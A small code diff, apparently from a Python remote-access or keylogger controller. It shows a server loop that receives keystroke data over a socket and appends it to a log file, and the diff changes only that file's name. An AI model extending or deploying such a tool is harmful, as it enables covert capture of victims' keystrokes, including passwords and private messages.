@@ -74,7 +74,7 @@ class Server():
                 while True:
                     dkey=str(self.c.recv(99999).decode())
                     print(dkey)
-                    with open("key_log.log","a") as f:
+                    with open("key_log.txt","a") as f:
                         f.write(dkey+"\n")
             # Get All Running Process
             elif choice==7:
